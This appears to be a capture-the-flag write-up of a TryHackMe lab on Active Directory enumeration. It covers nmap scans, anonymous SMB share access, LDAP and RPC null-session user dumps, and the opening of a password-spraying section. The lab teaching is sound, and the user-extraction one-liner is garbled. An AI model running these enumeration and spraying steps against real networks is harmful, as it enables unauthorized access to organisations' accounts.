---
description: https://tryhackme.com/room/adbasicenumeration
---

# AD: Basic Enumeration

<div align="left"><figure><img src="../.gitbook/assets/image (43).png" alt="" width="150"><figcaption><p>@TryHackMe</p></figcaption></figure></div>

🔗 [AD: Basic Enumeration](https://tryhackme.com/room/adbasicenumeration)

## Task 1 - Deploy machine <a href="#task-0-deploy-machine" id="task-0-deploy-machine"></a>

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

Attacker Machine: `10.250.11.15`

🎯 Target IP: `10.211.11.20` | `10.211.11.10`

### Download VPN

Go here to download correct network VPN (select networks and room name) server and not the classic VPN file for normal machines: [https://tryhackme.com/access](https://tryhackme.com/access)

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Start VPN in a dedicated shell: `sudo openvpn devangelist-Jr-Pentester-AD-v01.ovpn`

Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine.

```bash
su
echo "10.211.11.10 ad.thm" >> /etc/hosts

mkdir -p thm/AD/AD_Enum
cd thm/AD/AD_Enum
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

## Task 2 - Mapping Out the Network

**Host Discovery**

Executing `route` or `ip route` commands we can see another subnet in our: `10.211.11.0/24`

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

starting to send an ICMP requests to determine if a host is live or not, to do it we're using fping that permits to ping subnets:

```bash
fping -agq 10.211.11.0/24
# -a: shows systems that are alive.
# -g: generates a target list from a supplied IP netmask.
# -q: quiet mode, doesn't show per-probe results or ICMP error messages.
```

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

```bash
10.211.11.1
10.211.11.10
10.211.11.20
10.211.11.250
```

in alternative we can do the same using `sudo nmap -sn 10.211.11.0/24`

Excluding the gateway `10.211.11.1` we can save others IP into a file called `hosts.txt`.

Once we've discovered live hosts, we must identify which one is the Domain Controller (DC) to determine which critical AD-related services are being used and can be exploited. These are some common Active Directory ports and protocols:

| Port | Protocol           | What it Means                                 |
| ---- | ------------------ | --------------------------------------------- |
| 88   | Kerberos           | Potential for Kerberos-based enumeration      |
| 135  | MS-RPC             | Potential for RPC enumeration (null sessions) |
| 139  | SMB/NetBIOS        | Legacy SMB access                             |
| 389  | LDAP               | LDAP queries to AD                            |
| 445  | SMB                | Modern SMB access, critical for enumeration   |
| 464  | Kerberos (kpasswd) | Password-related Kerberos service             |

We can run a service version scan with these specific ports to help identify the DC:

```bash
sudo nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt -oN port_scan
```

* `-sV`: This enables version detection. Nmap will try to determine the version of the services running on the open ports.
* `-sC`: Runs Nmap Scripting Engine (NSE) scripts in the default category.
* `-iL`: This tells Nmap to read the list of target hosts from the file `hosts.txt`. Each line in this file should contain a single IP address or hostname.
* `-oN`: This save result into a text file called port\_scan.

```
PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-08 10:45:36Z)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: tryhackme.loc0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds Windows Server 2019 Datacenter 17763 microsoft-ds (workgroup: TRYHACKME)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 4s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: DC
|   NetBIOS computer name: DC\x00
|   Domain name: tryhackme.loc
|   Forest name: tryhackme.loc
|   FQDN: DC.tryhackme.loc
|_  System time: 2025-06-08T10:45:47+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2025-06-08T10:45:42
|_  start_date: N/A

Nmap scan report for 10.211.11.20
Host is up (0.066s latency).

PORT    STATE  SERVICE       VERSION
88/tcp  closed kerberos-sec
135/tcp open   msrpc         Microsoft Windows RPC
139/tcp open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp closed ldap
445/tcp open   microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-08T10:45:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s

Nmap scan report for 10.211.11.250
Host is up (0.065s latency).

PORT    STATE  SERVICE      VERSION
88/tcp  closed kerberos-sec
135/tcp closed msrpc
139/tcp closed netbios-ssn
389/tcp closed ldap
445/tcp closed microsoft-ds

Post-scan script results:
| clock-skew: 
|   1s: 
|     10.211.11.10 (ad.thm)
|_    10.211.11.20
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 27.49 seconds
```

It seems that `10.200.12.250` is the VPN server, so we can ignore it.

Go in depth checking services present on our target execute:

```bash
sudo nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt
```

* `-sS`: TCP SYN scan, which is stealthier than a full connect scan
* `-p-`: Scans all 65,535 TCP ports.
* `-T3`: Sets the timing template to "normal" to balance speed and stealth.
* `-iL hosts.txt`: Inputs the list of live hosts from the previous nmap command.
* `-oN full_port_scan.txt`: Outputs the results to a file.

```
Nmap scan report for ad.thm (10.211.11.10)
Host is up (0.063s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49672/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
49683/tcp open  unknown
49703/tcp open  unknown
49776/tcp open  unknown

Nmap scan report for 10.211.11.20
Host is up (0.070s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49677/tcp open  unknown
50095/tcp open  unknown
```

### 2.1 - What is the domain name of our target?

Checking result of nmap first scan we can see the domain name:

```
smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: DC
|   NetBIOS computer name: DC\x00
|   Domain name: tryhackme.loc
|   Forest name: tryhackme.loc
|   FQDN: DC.tryhackme.loc
|_  System time: 2025-06-08T10:45:47+00:00
```

{% hint style="info" %}
tryhackme.loc
{% endhint %}

### 2.2 - What version of Windows Server is running on the DC?

as the previous task, we can see OS version running on our DC:

```
OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
```

{% hint style="info" %}
Windows Server 2019 Datacenter
{% endhint %}

## Task 3 - Network Enumeration With SMB

We can start an nmap active scan, analyzing interesting ports:

```bash
sudo nmap -p 88,135,139,389,445,636 -sV -sC 10.211.11.10
```

```
PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-22 08:50:22Z)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: tryhackme.loc0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds Windows Server 2019 Datacenter 17763 microsoft-ds (workgroup: TRYHACKME)
636/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: DC
|   NetBIOS computer name: DC\x00
|   Domain name: tryhackme.loc
|   Forest name: tryhackme.loc
|   FQDN: DC.tryhackme.loc
|_  System time: 2025-06-22T08:50:27+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-22T08:50:23
|_  start_date: N/A
|_clock-skew: mean: 3s, deviation: 2s, median: 1s
```

### Listing SMB Shares

Try to list SMB shares with anon login authentication:

```bash
smbclient -L //10.211.11.10 -N
```

```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	AnonShare       Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SharedFiles     Disk      
	SYSVOL          Disk      Logon server share 
	UserBackups     Disk      

```

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

and check theirs permissions using smbmap:

```bash
smbmap -H 10.211.11.10
```

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Running either of the above commands, we can notice that there are three non-standard shares that catch our attention: `AnonShare`, `SharedFiles` and `UserBackups`.

We can check others informations using nmap and its script smb-enum-shares:

```bash
sudo nmap -p445 --script smb-enum-shares 10.211.11.10
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 13:55 EDT
Nmap scan report for ad.thm (10.211.11.10)
Host is up (0.068s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: <blank>
|   \\10.211.11.10\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|   \\10.211.11.10\AnonShare: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: READ/WRITE
|   \\10.211.11.10\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|   \\10.211.11.10\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ/WRITE
|   \\10.211.11.10\NETLOGON: 
|     Type: STYPE_DISKTREE
|     Comment: Logon server share 
|     Anonymous access: READ
|   \\10.211.11.10\SYSVOL: 
|     Type: STYPE_DISKTREE
|     Comment: Logon server share 
|     Anonymous access: READ
|   \\10.211.11.10\SharedFiles: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: READ/WRITE
|   \\10.211.11.10\UserBackups: 
|     Type: STYPE_DISKTREE
|     Comment: 
|_    Anonymous access: READ/WRITE

```

### Accessing SMB Shares

We can access to ShareFiles share using anonymous authentication and discover into a file called Mouse\_and\_Malware.txt:

```bash
smbclient //10.211.11.10/SharedFiles -N
ls
get Mouse_and_Malware.txt
exit
cat Mouse_and_Malware.txt
```

<figure><img src="../.gitbook/assets/image (525).png" alt=""><figcaption></figcaption></figure>

### 3.1 - What is the flag hidden in one of the shares?

Searching in the others shared folders always with anonymous authentication mode, we can see that there're two interested file into UserBackup share, go there and download our flag:\


```bash
smbclient //10.211.11.10/UserBackups -N
ls
get flag.txt
get story.txt
exit
cat flag.txt
cat story.txt
```

<figure><img src="../.gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>🚩 Flag 1</summary>

THM{88\_SMB\_88}

</details>

## Task 4 - Domain Enumeration

### LDAP Enumeration (Anonymous Bind)

LDAP helps locate and organise resources within a network, including users, groups, devices, and organisational information, by providing a central directory that applications and users can query.\
Some LDAP servers allow anonymous users to perform read-only queries. This can expose user accounts and other directory information.

We can test if anonymous LDAP bind is enabled with `ldapsearch`:

If it is enabled, we should see lots of data, similar to the output below:

* `-x`: Simple authentication, in our case, anonymous authentication.
* `-H`: Specifies the LDAP server.
* `-s`: Limits the query only to the base object and does not search subtrees or children.

```bash
ldapsearch -x -H ldap://10.211.11.10 -s base
```

<figure><img src="../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>

We can then query user information with this command:

```bash
ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"
```

```
# douglas.roberts, Marketing, People, tryhackme.loc
dn: CN=douglas.roberts,OU=Marketing,OU=People,DC=tryhackme,DC=loc
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: douglas.roberts
sn: Roberts
title: Mid-level
givenName: Douglas
distinguishedName: CN=douglas.roberts,OU=Marketing,OU=People,DC=tryhackme,DC=l
 oc
instanceType: 4
whenCreated: 20250430141723.0Z
whenChanged: 20250605202111.0Z
displayName: Douglas Roberts
uSNCreated: 21095
memberOf: CN=Internet Access,OU=Groups,DC=tryhackme,DC=loc
uSNChanged: 115528
department: Marketing
name: douglas.roberts
objectGUID:: TBwrlPOwdU2/uitRLqHNDw==
userAccountControl: 512
badPwdCount: 5
codePage: 0
countryCode: 0
badPasswordTime: 133937966788807646
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133904962436293169
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAXgYAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: douglas.roberts
sAMAccountType: 805306368
lockoutTime: 133936284711496081
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dSCorePropagationData: 20250514163924.0Z
dSCorePropagationData: 16010101000001.0Z

# dawn.bolton, Engineering, People, tryhackme.loc
dn: CN=dawn.bolton,OU=Engineering,OU=People,DC=tryhackme,DC=loc
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: dawn.bolton
sn: Bolton
title: Associate
givenName: Dawn
distinguishedName: CN=dawn.bolton,OU=Engineering,OU=People,DC=tryhackme,DC=loc
instanceType: 4
whenCreated: 20250430150643.0Z
whenChanged: 20250605202111.0Z
displayName: Dawn Bolton
uSNCreated: 21125
memberOf: CN=Internet Access,OU=Groups,DC=tryhackme,DC=loc
uSNChanged: 115530
department: Engineering
name: dawn.bolton
objectGUID:: BH7mZMYwDE6de/yYVjU2GQ==
userAccountControl: 514
badPwdCount: 5
codePage: 0
countryCode: 0
badPasswordTime: 133937966799588991
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAXwYAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: dawn.bolton
sAMAccountType: 805306368
lockoutTime: 133936284711808789
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dSCorePropagationData: 20250514163924.0Z
dSCorePropagationData: 16010101000001.0Z

# danielle.ali, Consulting, People, tryhackme.loc
dn: CN=danielle.ali,OU=Consulting,OU=People,DC=tryhackme,DC=loc
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: danielle.ali
sn: Ali
title: Manager
givenName: Danielle
distinguishedName: CN=danielle.ali,OU=Consulting,OU=People,DC=tryhackme,DC=loc
instanceType: 4
whenCreated: 20250430150644.0Z
whenChanged: 20250605202111.0Z
displayName: Danielle Ali
uSNCreated: 21131
memberOf: CN=Internet Access,OU=Groups,DC=tryhackme,DC=loc
uSNChanged: 115532
department: Consulting
name: danielle.ali
objectGUID:: NUG/+5V0aUWWX7rHihzdiA==
userAccountControl: 512
badPwdCount: 5
codePage: 0
countryCode: 0
badPasswordTime: 133937966810057441
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133904992043325117
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAYAYAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: danielle.ali
sAMAccountType: 805306368
lockoutTime: 133936284712121090
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dSCorePropagationData: 20250514163924.0Z
dSCorePropagationData: 16010101000001.0Z

# michelle.palmer, Marketing, People, tryhackme.loc
dn: CN=michelle.palmer,OU=Marketing,OU=People,DC=tryhackme,DC=loc
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: michelle.palmer
sn: Palmer
title: Associate
givenName: Michelle
distinguishedName: CN=michelle.palmer,OU=Marketing,OU=People,DC=tryhackme,DC=l
 oc
instanceType: 4
whenCreated: 20250430150644.0Z
whenChanged: 20250605202111.0Z
displayName: Michelle Palmer
uSNCreated: 21140
memberOf: CN=Internet Access,OU=Groups,DC=tryhackme,DC=loc
uSNChanged: 115534
department: Marketing
name: michelle.palmer
objectGUID:: kGGgiVkSWUSDtsfaLHr4wQ==
userAccountControl: 514
badPwdCount: 5
codePage: 0
countryCode: 0
badPasswordTime: 133937966822401525
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAYQYAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: michelle.palmer
sAMAccountType: 805306368
lockoutTime: 133936284712590548
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dSCorePropagationData: 20250514163924.0Z
dSCorePropagationData: 16010101000001.0Z

# katie.thomas, Consulting, People, tryhackme.loc
dn: CN=katie.thomas,OU=Consulting,OU=People,DC=tryhackme,DC=loc
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: katie.thomas
sn: Thomas
title: Associate
givenName: Katie
distinguishedName: CN=katie.thomas,OU=Consulting,OU=People,DC=tryhackme,DC=loc
instanceType: 4
whenCreated: 20250430150644.0Z
whenChanged: 20250605202111.0Z
displayName: Katie Thomas
uSNCreated: 21146
memberOf: CN=Internet Access,OU=Groups,DC=tryhackme,DC=loc
uSNChanged: 115536
department: Consulting
name: katie.thomas
objectGUID:: 1I2VoFIma0qxmIAyfv0uhQ==
userAccountControl: 66050
badPwdCount: 5
codePage: 0
countryCode: 0
badPasswordTime: 133937966835683264
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133913636960882349
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAYgYAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: katie.thomas
sAMAccountType: 805306368
lockoutTime: 133936284712902514
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dSCorePropagationData: 20250514163924.0Z
dSCorePropagationData: 16010101000001.0Z
msDS-SupportedEncryptionTypes: 0

# jennifer.harding, Sales, People, tryhackme.loc
dn: CN=jennifer.harding,OU=Sales,OU=People,DC=tryhackme,DC=loc
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: jennifer.harding
sn: Harding
title: Mid-level
givenName: Jennifer
distinguishedName: CN=jennifer.harding,OU=Sales,OU=People,DC=tryhackme,DC=loc
instanceType: 4
whenCreated: 20250430150644.0Z
whenChanged: 20250605202111.0Z
displayName: Jennifer Harding
uSNCreated: 21152
memberOf: CN=Internet Access,OU=Groups,DC=tryhackme,DC=loc
uSNChanged: 115538
department: Sales
name: jennifer.harding
objectGUID:: B/va7n7ivUeoj3s9EwGccg==
userAccountControl: 512
badPwdCount: 5
codePage: 0
countryCode: 0
badPasswordTime: 133937966846151187
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133904992046135906
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAYwYAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: jennifer.harding
sAMAccountType: 805306368
lockoutTime: 133936284713214585
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dSCorePropagationData: 20250514163924.0Z
dSCorePropagationData: 16010101000001.0Z

# strate905, IT, People, tryhackme.loc
dn: CN=strate905,OU=IT,OU=People,DC=tryhackme,DC=loc
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: strate905
givenName: strate905
distinguishedName: CN=strate905,OU=IT,OU=People,DC=tryhackme,DC=loc
instanceType: 4
whenCreated: 20250501102105.0Z
whenChanged: 20250605202111.0Z
displayName: strate905
uSNCreated: 21454
memberOf: CN=Remote Management Users,CN=Builtin,DC=tryhackme,DC=loc
memberOf: CN=Remote Desktop Users,CN=Builtin,DC=tryhackme,DC=loc
uSNChanged: 115546
name: strate905
objectGUID:: NFS4xDTnlEW3Vet12zO8Qg==
userAccountControl: 66048
badPwdCount: 5
codePage: 0
countryCode: 0
badPasswordTime: 133937966891151881
lastLogoff: 0
lastLogon: 133905758092262617
pwdLastSet: 133905684659331867
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAZwYAAA==
accountExpires: 9223372036854775807
logonCount: 5
sAMAccountName: strate905
sAMAccountType: 805306368
userPrincipalName: strate905@tryhackme.loc
lockoutTime: 133936284714777250
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dSCorePropagationData: 20250514163924.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133905685305999879

# Kerb Svc, ServiceAccounts, tryhackme.loc
dn: CN=Kerb Svc,OU=ServiceAccounts,DC=tryhackme,DC=loc
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Kerb Svc
sn: Svc
givenName: Kerb
distinguishedName: CN=Kerb Svc,OU=ServiceAccounts,DC=tryhackme,DC=loc
instanceType: 4
whenCreated: 20250501131319.0Z
whenChanged: 20250605202849.0Z
displayName: Kerb Svc
uSNCreated: 21539
uSNChanged: 115866
name: Kerb Svc
objectGUID:: DKEmusf7nE+3SxAFp1NCtQ==
userAccountControl: 66048
badPwdCount: 5
codePage: 0
countryCode: 0
badPasswordTime: 133937966903339056
lastLogoff: 0
lastLogon: 133936289293101403
pwdLastSet: 133905787996455492
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAaAYAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: krbtgtsvc
sAMAccountType: 805306368
userPrincipalName: krbtgtsvc@tryhackme.loc
lockoutTime: 0
servicePrincipalName: HTTP/lab-web.tryhackme.loc
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dSCorePropagationData: 20250514163924.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133936289293101403

# asrepuser1, Users, tryhackme.loc
dn: CN=asrepuser1,CN=Users,DC=tryhackme,DC=loc
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: asrepuser1
distinguishedName: CN=asrepuser1,CN=Users,DC=tryhackme,DC=loc
instanceType: 4
whenCreated: 20250502032908.0Z
whenChanged: 20250605210447.0Z
uSNCreated: 53280
uSNChanged: 116055
name: asrepuser1
objectGUID:: PrAQuwAICEO8n7TrEaBBDA==
userAccountControl: 4260352
badPwdCount: 5
codePage: 0
countryCode: 0
badPasswordTime: 133937966914745399
lastLogoff: 0
lastLogon: 133937941708785995
pwdLastSet: 133906306110053757
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAaQYAAA==
accountExpires: 9223372036854775807
logonCount: 15
sAMAccountName: asrepuser1
sAMAccountType: 805306368
lockoutTime: 0
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dSCorePropagationData: 20250514163924.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133936310878467180

# Raoul Duke, Users, tryhackme.loc
dn: CN=Raoul Duke,CN=Users,DC=tryhackme,DC=loc
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Raoul Duke
sn: Duke
givenName: Raoul
distinguishedName: CN=Raoul Duke,CN=Users,DC=tryhackme,DC=loc
instanceType: 4
whenCreated: 20250513074600.0Z
whenChanged: 20250605173907.0Z
displayName: Raoul Duke
uSNCreated: 69676
uSNChanged: 114887
name: Raoul Duke
objectGUID:: NWLsrAinfE687hIoJA3Fow==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133937966918964176
lastLogoff: 0
lastLogon: 133937966921151490
pwdLastSet: 133915959609039319
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAMQoAAA==
accountExpires: 9223372036854775807
logonCount: 1
sAMAccountName: rduke
sAMAccountType: 805306368
userPrincipalName: rduke@tryhackme.loc
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dSCorePropagationData: 20250514163924.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133936187470120310

# User, Finance, People, tryhackme.loc
dn: CN=User,OU=Finance,OU=People,DC=tryhackme,DC=loc
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: User
givenName: User
distinguishedName: CN=User,OU=Finance,OU=People,DC=tryhackme,DC=loc
instanceType: 4
whenCreated: 20250515145717.0Z
whenChanged: 20250515145717.0Z
displayName: User
uSNCreated: 106571
uSNChanged: 106577
name: User
objectGUID:: fklfTKosMEyhtlCzZNmmaA==
userAccountControl: 66048
badPwdCount: 2
codePage: 0
countryCode: 0
badPasswordTime: 133936300026561482
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133917946372728232
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAARIAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: user
sAMAccountType: 805306368
userPrincipalName: user@tryhackme.loc
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dSCorePropagationData: 20250515145717.0Z
dSCorePropagationData: 16010101000000.0Z

# search reference
ref: ldap://ForestDnsZones.tryhackme.loc/DC=ForestDnsZones,DC=tryhackme,DC=loc

# search reference
ref: ldap://DomainDnsZones.tryhackme.loc/DC=DomainDnsZones,DC=tryhackme,DC=loc

# search reference
ref: ldap://tryhackme.loc/CN=Configuration,DC=tryhackme,DC=loc

# search result
search: 2
result: 0 Success

# numResponses: 33
# numEntries: 29
# numReferences: 3

```

### RPC Enumeration (Null Sessions)

Microsoft Remote Procedure Call (MSRPC) is a protocol that enables a program running on one computer to request services from a program on another computer, without needing to understand the underlying details of the network. RPC services can be accessed over the SMB protocol. When SMB is configured to allow null sessions that do not require authentication, an unauthenticated user can connect to the IPC$ share and enumerate users, groups, shares, and other sensitive information from the system or domain.

We can run the following command to verify null session access with:

```bash
rpcclient -U "" 10.211.11.10 -N
```

* `-U`: Used to specify the username, in our case, we are using an empty string for anonymous login.
* `-N`: Tells RPC not to prompt us for a password.

and enumerate users with: `enumdomusers`

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[sshd] rid:[0x649]
user:[gerald.burgess] rid:[0x650]
user:[nigel.parsons] rid:[0x651]
user:[guy.smith] rid:[0x652]
user:[jeremy.booth] rid:[0x653]
user:[barbara.jones] rid:[0x654]
user:[marion.kay] rid:[0x655]
user:[kathryn.williams] rid:[0x656]
user:[danny.baker] rid:[0x657]
user:[gary.clarke] rid:[0x658]
user:[daniel.turner] rid:[0x659]
user:[debra.yates] rid:[0x65a]
user:[jeffrey.thompson] rid:[0x65b]
user:[martin.riley] rid:[0x65c]
user:[danielle.lee] rid:[0x65d]
user:[douglas.roberts] rid:[0x65e]
user:[dawn.bolton] rid:[0x65f]
user:[danielle.ali] rid:[0x660]
user:[michelle.palmer] rid:[0x661]
user:[katie.thomas] rid:[0x662]
user:[jennifer.harding] rid:[0x663]
user:[strategos] rid:[0x664]
user:[empanadal0v3r] rid:[0x665]
user:[drgonz0] rid:[0x666]
user:[strate905] rid:[0x667]
user:[krbtgtsvc] rid:[0x668]
user:[asrepuser1] rid:[0x669]
user:[rduke] rid:[0xa31]
user:[user] rid:[0x1201]
```

We can extract only the user using the following bash command: `sed -n 's/^user:[(.`_`)] rid:.`_`$/\1/p' users.txtep -o 'user:[[^]]`_`]' users.txt | sed 's/user:[(.`_`)]/\1/'`

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

## Task 5 - Password Spraying

Password spraying is an attack technique where a small set of common passwords is tested across many accounts. Unlike brute-force attacks, password spraying avoids account lockouts by testing each account with only a few attempts, exploiting poor password practices common in many organisations. Password spraying is often effective because many organisations:

* Require frequent password changes, leading users to pick predictable patterns (for example, `Summer2025!`).
* Don't enforce their policies well.
* Reuse common passwords across multiple accounts.

### Password Policy

Before we can start our attack, it is essential to understand our target's password policy. This will allow us to retrieve information about the minimum password length, complexity, and the number of failed attempts that will lock out an account.

**rpcclient**

We can use rpcclient via a null session to query the DC for the password policy:

`rpcclient -U "" 10.211.11.10 -N`

And then we can run the `getdompwinfo` command:

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

### 5.1 - What is the minimum password length?

**CrackMapExec**

